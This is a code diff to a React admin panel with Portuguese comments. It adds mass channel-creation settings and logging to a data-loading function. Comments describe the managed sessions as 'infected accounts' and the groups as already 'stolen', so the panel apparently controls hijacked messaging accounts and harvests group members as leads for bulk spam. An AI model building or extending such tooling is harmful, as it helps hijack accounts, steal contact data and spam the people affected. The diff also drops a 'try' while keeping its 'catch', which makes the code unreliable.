@@ -70,6 +70,15 @@ export default function AdminPanel() {
   const [channelMessage, setChannelMessage] = useState('');
   const [channelMediaUrl, setChannelMediaUrl] = useState('');
   const [selectedChannelPhones, setSelectedChannelPhones] = useState(new Set());
+  
+  // --- ESTADOS DO CRIAÇÃO MASSIVA ---
+  const [massCreating, setMassCreating] = useState(false);
+  const [massChannelPrefix, setMassChannelPrefix] = useState('');
+  const [massChannelDescription, setMassChannelDescription] = useState('');
+  const [leadsPerChannel, setLeadsPerChannel] = useState(100);
+  const [startNumber, setStartNumber] = useState(1);
+  const [batchSize, setBatchSize] = useState(5);
+  const [delayBetweenChannels, setDelayBetweenChannels] = useState(10);
   // --- FUNÇÕES DO GERENCIADOR DE CANAIS ---
   const loadChannels = async () => {
     try {
@@ -430,13 +439,19 @@ export default function AdminPanel() {
   };
 
   const fetchData = async () => {
-    try {
+      console.log('🔄 Iniciando fetchData...');
+      
       // 1. Carrega Contas Infectadas
+      console.log('📱 Buscando sessões...');
       const sRes = await authenticatedFetch('/api/list-sessions');
+      console.log('📱 Resposta sessions:', sRes.status);
+      
       const sData = await sRes.json();
+      console.log('📱 Dados sessions:', sData);
       
       setSessions(prev => {
           const newSessions = sData.sessions || [];
+          console.log('📱 Sessions recebidas:', newSessions.length);
           return newSessions.map(ns => {
               // Mantém o estado visual 'is_active' anterior para evitar que o ícone pisque
               const old = prev.find(p => p.phone_number === ns.phone_number);
@@ -445,20 +460,32 @@ export default function AdminPanel() {
       });
       
       // 2. Carrega Estatísticas de Leads
+      console.log('📊 Buscando stats...');
       const stRes = await authenticatedFetch('/api/stats');
+      console.log('📊 Resposta stats:', stRes.status);
+      
       if (stRes.ok) {
-          setStats(await stRes.json());
+          const statsData = await stRes.json();
+          console.log('📊 Dados stats:', statsData);
+          setStats(statsData);
       }
       
       // 3. Carrega Memória de Grupos já Roubados (para marcar em verde)
+      console.log('🧠 Buscando harvested...');
       const hRes = await authenticatedFetch('/api/get-harvested');
+      console.log('🧠 Resposta harvested:', hRes.status);
+      
       const hData = await hRes.json();
+      console.log('🧠 Dados harvested:', hData);
+      
       if(hData.harvestedIds) {
           setHarvestedIds(new Set(hData.harvestedIds));
       }
-
-    } catch (error) { 
-        console.error("Erro ao sincronizar dados:", error); 
+      
+      console.log('✅ fetchData concluído com sucesso!');
+    } catch (e) {
+      console.error('❌ Erro em fetchData:', e);
+      addLog(`⛠️ Erro ao carregar dados: ${e.message}`);
     }
   };
 
